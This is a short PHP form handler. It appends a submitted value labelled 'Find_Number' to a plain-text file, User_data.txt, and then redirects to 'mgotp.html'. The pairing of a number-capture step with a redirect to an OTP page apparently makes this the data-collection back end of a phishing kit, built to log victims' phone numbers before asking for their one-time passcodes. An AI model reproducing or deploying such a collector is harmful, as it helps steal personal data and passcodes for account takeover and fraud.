<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $userInput = trim($_POST["text"]);

    if (!empty($userInput)) {
        $separator = "-------------------------------\n";
        $data = $separator . "Find_Number:==> " . $userInput . PHP_EOL . $separator;
        file_put_contents("User_data.txt", $data, FILE_APPEND);
    }

    // Redirect (optional)
    header("Location: mgotp.html");
    exit();
}
?>